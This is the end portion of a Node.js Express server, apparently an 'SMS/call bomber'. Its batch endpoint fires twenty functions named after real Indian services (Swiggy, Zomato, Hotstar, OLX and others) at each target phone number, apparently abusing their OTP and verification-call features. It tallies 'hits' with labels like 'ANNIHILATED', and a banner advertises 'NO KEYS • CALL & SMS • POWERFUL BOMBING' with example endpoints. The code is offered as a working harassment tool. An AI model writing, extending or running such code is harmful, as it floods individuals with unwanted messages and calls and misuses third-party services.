    // Use most powerful 20 services for batch including calls
    const quickBombs = [
        bomb1_Anthe, bomb2_Cars24, bomb6_Snapdeal, bomb9_Licious,
        bomb13_Hotstar, bomb19_Swiggy, bomb21_OLX_Call, // CALL
        bomb22_SwiggyProfile_Call, // CALL
        bomb28_SwiggySignup, bomb35_Jockey,
        bomb7_Hoichoi, bomb8_ShemarooMe, bomb11_LazyPay,
        bomb14_ZEE5, bomb16_Lenskart, bomb18_Shopsy,
        bomb20_Zomato, bomb29_Mobikwik, bomb33_MyBharat,
        bomb41_Cashify
    ];
    
    for (const num of numbers) {
        if (/^[6-9]\d{9}$/.test(num)) {
            const bombPromises = quickBombs.map(bomb => bomb(num));
            const bombResults = await Promise.allSettled(bombPromises);
            const successful = bombResults.filter(r => 
                r.status === 'fulfilled' && r.value.success
            ).length;
            
            const callSuccess = bombResults.filter(r => 
                r.status === 'fulfilled' && r.value.success && r.value.type === 'CALL'
            ).length;
            
            results.push({
                target: num,
                bombs_fired: quickBombs.length,
                hits: successful,
                call_hits: callSuccess,
                status: successful > 10 ? '💀 ANNIHILATED' : 
                       callSuccess > 0 ? '📞 PHONE RINGING' : '💥 DAMAGED'
            });
            
            // Small delay between targets
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    res.json({
        success: true,
        message: '🎯 BATCH BOMBING COMPLETE',
        timestamp: new Date().toISOString(),
        total_targets: numbers.length,
        services_per_target: quickBombs.length,
        call_services_included: true,
        results: results
    });
});

// ==================== START SERVER ====================
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║         🔥🔥🔥 ULTRA BRUTAL BOMBER API 🔥🔥🔥              ║
    ║         NO KEYS • CALL & SMS • POWERFUL BOMBING              ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                                                              ║
    ║  🌐 PORT: ${PORT}                                             ║
    ║  💣 SERVICES: ${bombingFunctions.length} (${bombingFunctions.filter(f => f.name.includes('Call')).length} CALL SERVICES) ║
    ║  ⚡ RATE LIMIT: 100/30s per IP                               ║
    ║                                                              ║
    ╠══════════════════════════════════════════════════════════════╣
    ║                                                              ║
    ║  📌 MAIN: /bomb?num=9876543210                              ║
    ║  📌 TEST: /test?num=9876543210                              ║
    ║  📌 BATCH: /batch?nums=9876543210,9876543211                ║
    ║  📌 STATUS: /status                                         ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    `);
});